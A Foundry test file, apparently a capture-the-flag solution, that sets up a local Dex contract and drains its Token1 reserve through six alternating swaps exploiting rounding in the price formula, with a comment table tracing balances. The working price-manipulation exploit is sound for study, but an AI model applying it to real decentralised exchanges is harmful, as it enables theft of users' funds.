// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level22.sol";
import "forge-std/Test.sol";
/**
 * Calculations
 *     Dex Token1: 100, Token2: 100 || Player Token1:  10, Token2:  10 || swap: 10 token1
 *     Dex Token1: 110, Token2:  90 || Player Token1:   0, Token2:  20 || swap: 20 token2
 *     Dex Token1:  86, Token2: 110 || Player Token1:  24, Token2:   0 || swap: 24 token1
 *     Dex Token1: 110, Token2:  80 || Player Token1:   0, Token2:  30 || swap: 30 token2
 *     Dex Token1:  69, Token2: 110 || Player Token1:  41, Token2:   0 || swap: 41 token1
 *     Dex Token1: 110, Token2:  45 || Player Token1:   0, Token2:  65 || swap: 45 token2
 *     Dex Token1:   0, Token2:  90 || Player Token1: 110, Token2:  20
 */

contract ExploitLevel22 is Test {
    Dex instance = new Dex();
    SwappableToken token1 = new SwappableToken(address(instance), "Token1", "TKN1", 1000);
    SwappableToken token2 = new SwappableToken(address(instance), "Token2", "TKN2", 1000);
    address instanceAddr = address(instance);
    address token1Addr = address(token1);
    address token2Addr = address(token2);
    address player = vm.addr(1);

    function testExploit() external {
        instance.setTokens(token1Addr, token2Addr);
        instance.approve(instanceAddr, 100);
        instance.addLiquidity(token1Addr, 100);
        instance.addLiquidity(token2Addr, 100);
        token1.transfer(player, 10);
        token2.transfer(player, 10);

        vm.startPrank(player);
        instance.approve(instanceAddr, 100);

        instance.swap(token2Addr, token1Addr, 10);
        instance.swap(token1Addr, token2Addr, 20);
        instance.swap(token2Addr, token1Addr, 24);
        instance.swap(token1Addr, token2Addr, 30);
        instance.swap(token2Addr, token1Addr, 41);
        instance.swap(token1Addr, token2Addr, 45);

        vm.stopPrank();

        console.log("Player balance of Token1:", instance.balanceOf(token1Addr, player));
        console.log("Player balance of Token2:", instance.balanceOf(token2Addr, player));
        console.log("Instance balance of Token1:", instance.balanceOf(token1Addr, instanceAddr));
        console.log("Instance balance of Token2:", instance.balanceOf(token2Addr, instanceAddr));
    }
}
